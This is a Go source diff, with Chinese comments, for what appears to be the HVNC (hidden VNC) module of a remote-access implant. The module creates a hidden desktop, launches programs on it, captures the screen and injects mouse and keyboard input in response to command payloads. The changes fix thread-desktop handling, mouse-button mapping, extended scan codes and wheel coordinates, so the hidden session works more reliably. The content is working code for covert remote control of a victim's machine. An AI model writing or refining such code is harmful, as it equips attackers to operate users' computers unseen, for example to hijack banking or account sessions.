@@ -45,14 +45,18 @@ type hvncMouseEvent struct {
 	Type   string  `json:"type"`   // mousemove | mousedown | mouseup | wheel
 	X      float64 `json:"x"`      // 0-1（相对捕获图像）
 	Y      float64 `json:"y"`      // 0-1
-	Button int     `json:"button"` // 0=left 1=right 2=middle
+	Button int     `json:"button"` // DOM MouseEvent.button: 0=left 1=middle 2=right
 	Wheel  int     `json:"wheel"`  // 滚轮增量
 }
 
 type hvncKeyEvent struct {
 	Type string `json:"type"` // keydown | keyup
-	Scan uint32 `json:"scan"` // 键盘 scan code
-	Vk   uint32 `json:"vk"`   // 虚拟键码（兜底）
+	// Scan 是 set-1 扫描码。兼容两种前端编码：
+	//   - 基础码 + Extended=true
+	//   - 旧前端把扩展位编码进 bit7（0xC7 = 0x47|0x80）
+	Scan     uint32 `json:"scan"`
+	Vk       uint32 `json:"vk"`       // 虚拟键码（兜底）
+	Extended bool   `json:"extended"` // 扩展键（方向键/Home/Delete/右 Ctrl 等）
 }
 
 type hvncInputPacket struct {
@@ -156,6 +160,11 @@ type hvncInput struct {
 // StartHvnc 启动 HVNC 会话（隐藏桌面 + 目标程序 + 采集循环）
 // payload: [4B sidLen][sessionId][4B appLen][app][4B argsLen][args]（app 为空 = explorer）
 func StartHvnc(cmdBuf []byte) ([]byte, error) {
+	// SetThreadDesktop 只作用于**当前 OS 线程**；CreateProcess 可能阻塞并触发
+	// 协程迁移，未锁定线程时恢复桌面可能落到另一个线程，原线程残留隐藏桌面上下文。
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+
 	var sid, app, args string
 	if err := parseHvncStartPayload(cmdBuf, &sid, &app, &args); err != nil {
 		return nil, err
@@ -184,22 +193,21 @@ func StartHvnc(cmdBuf []byte) ([]byte, error) {
 
 	// 2. 保存原始桌面并切换（本线程，用于取隐藏桌面窗口句柄 + 启动目标程序）
 	orig := currentThreadDesktop()
-	if orig != 0 {
-		procSetThreadDesktop.Call(uintptr(desktop))
+	if r, _, _ := procSetThreadDesktop.Call(uintptr(desktop)); r == 0 {
+		procCloseDesktop.Call(uintptr(desktop))
+		return nil, errors.New("SetThreadDesktop(隐藏桌面) 失败")
 	}
+	// 无论后续成功失败都恢复原桌面（线程已锁定，配对可靠）
+	defer procSetThreadDesktop.Call(orig)
 	// 隐藏桌面窗口句柄（GetDesktopWindow 返回调用线程桌面的桌面窗口）
 	hiddenDeskWnd, _, _ := procGetDesktopWindow.Call(0)
 
 	// 3. 在隐藏桌面启动目标程序
 	procInfo, err := startProcessOnDesktop(desktopName, app, args)
 	if err != nil {
-		procSetThreadDesktop.Call(orig)
 		procCloseDesktop.Call(uintptr(desktop))
 		return nil, fmt.Errorf("在隐藏桌面启动程序失败: %v", err)
 	}
-
-	// 4. 恢复线程桌面
-	procSetThreadDesktop.Call(orig)
 
 	// 5. 获取虚拟屏幕尺寸作为初始捕获尺寸
 	vw, _, _ := procGetSystemMetricsHVNC.Call(78) // SM_CXVIRTUALSCREEN
@@ -407,18 +415,18 @@ func SendHvncInput(cmdBuf []byte) ([]byte, error) {
 		case "mousedown":
 			switch m.Button {
 			case 1:
-				flags |= mouseEventRightDown
+				flags |= mouseEventMiddleDown // DOM: 1=middle
 			case 2:
-				flags |= mouseEventMiddleDown
+				flags |= mouseEventRightDown // DOM: 2=right
 			default:
 				flags |= mouseEventLeftDown
 			}
 		case "mouseup":
 			switch m.Button {
 			case 1:
-				flags |= mouseEventRightUp
-			case 2:
 				flags |= mouseEventMiddleUp
+			case 2:
+				flags |= mouseEventRightUp
 			default:
 				flags |= mouseEventLeftUp
 			}
@@ -430,16 +438,16 @@ func SendHvncInput(cmdBuf []byte) ([]byte, error) {
 		inputs = append(inputs, in)
 	}
 	for _, k := range pkt.Keys {
+		scan, extended := normalizeScanCode(k.Scan, k.Extended)
 		flags := uint32(keyEventScanCode)
 		if k.Type == "keyup" {
 			flags |= keyEventKeyUp
 		}
-		// 扩展键（方向键/Home/End/Insert/Delete/PgUp/PgDn/右侧 Ctrl/Alt 等）需要 EXTENDEDKEY 标志
-		if k.Scan > 0 && isExtendedScanCode(uint16(k.Scan)) {
+		if extended {
 			flags |= keyEventExtendedKey
 		}
 		in := hvncInput{Type: inputKeyboard}
-		in.Union.Ki = hvncKeybdInput{WVk: uint16(k.Vk), WScan: uint16(k.Scan), DwFlags: flags}
+		in.Union.Ki = hvncKeybdInput{WVk: uint16(k.Vk), WScan: scan, DwFlags: flags}
 		inputs = append(inputs, in)
 	}
 
@@ -491,8 +499,12 @@ func (s *hvncSession) injectViaSendMessage(pkt hvncInputPacket) ([]byte, error) 
 		if hWnd == 0 {
 			hWnd = s.deskWnd
 		}
-		clientPt := s.screenToClient(hWnd, sx, sy)
-		lParam := uintptr(uint32(uint16(clientPt[0])) | (uint32(uint16(clientPt[1])) << 16))
+		// 鼠标消息用客户区坐标；WM_MOUSEWHEEL 的 lParam 是**屏幕**坐标
+		lParam := uintptr(uint32(uint16(sx)) | (uint32(uint16(sy)) << 16))
+		if m.Type != "wheel" {
+			clientPt := s.screenToClient(hWnd, sx, sy)
+			lParam = uintptr(uint32(uint16(clientPt[0])) | (uint32(uint16(clientPt[1])) << 16))
+		}
 
 		var msg uint32
 		var wParam uintptr
@@ -502,18 +514,18 @@ func (s *hvncSession) injectViaSendMessage(pkt hvncInputPacket) ([]byte, error) 
 		case "mousedown":
 			switch m.Button {
 			case 1:
-				msg, wParam = 0x0204, 2 // WM_RBUTTONDOWN
+				msg, wParam = 0x0207, 16 // WM_MBUTTONDOWN (DOM 1=middle)
 			case 2:
-				msg, wParam = 0x0207, 16 // WM_MBUTTONDOWN
+				msg, wParam = 0x0204, 2 // WM_RBUTTONDOWN (DOM 2=right)
 			default:
 				msg, wParam = 0x0201, 1 // WM_LBUTTONDOWN
 			}
 		case "mouseup":
 			switch m.Button {
 			case 1:
-				msg, wParam = 0x0205, 2 // WM_RBUTTONUP
-			case 2:
 				msg, wParam = 0x0208, 16 // WM_MBUTTONUP
+			case 2:
+				msg, wParam = 0x0205, 2 // WM_RBUTTONUP
 			default:
 				msg, wParam = 0x0202, 1 // WM_LBUTTONUP
 			}
@@ -542,8 +554,9 @@ func (s *hvncSession) injectViaSendMessage(pkt hvncInputPacket) ([]byte, error) 
 			}
 		}
 		// lParam: repeat=1 | scan<<16 | extended<<24 | keyup(bit31|bit30)
-		lParam := uintptr(1 | (uint32(k.Scan) << 16))
-		if k.Scan > 0 && isExtendedScanCode(uint16(k.Scan)) {
+		scan, extended := normalizeScanCode(k.Scan, k.Extended)
+		lParam := uintptr(1 | (uint32(scan) << 16))
+		if extended {
 			lParam |= 0x1000000
 		}
 		msg := uint32(0x0100) // WM_KEYDOWN
@@ -565,10 +578,26 @@ func (s *hvncSession) screenToClient(hWnd uintptr, sx, sy int) [2]int {
 	return [2]int{sx - int(rect.Left), sy - int(rect.Top)}
 }
 
+// normalizeScanCode 统一前端两种编码：显式 Extended 标志，或旧前端的 bit7 扩展位。
+// 返回基础 set-1 扫描码（0x47 而不是 0xC7）与是否扩展键。
+func normalizeScanCode(raw uint32, extendedFlag bool) (uint16, bool) {
+	scan := uint16(raw & 0x7FFF)
+	extended := extendedFlag
+	if scan&0x80 != 0 {
+		extended = true
+		scan &= 0x7F
+	}
+	if isExtendedScanCode(scan) {
+		extended = true
+	}
+	return scan, extended
+}
+
 // isExtendedScanCode 判断是否为需要 KEYEVENTF_EXTENDEDKEY 的扩展键 scan code
 func isExtendedScanCode(scan uint16) bool {
 	switch scan {
 	case 0x1C, 0x1D, 0x35, 0x37, 0x38, // 数字键盘 Enter、右 Ctrl、数字键盘 /、PrtSc、右 Alt
+		0x5B, 0x5C, // 左/右 Win
 		0x47, 0x48, 0x49, 0x4B, 0x4D, 0x4F, 0x50, 0x51, 0x52, 0x53: // Home/↑/PgUp/←/→/End/↓/PgDn/Ins/Del
 		return true
 	}
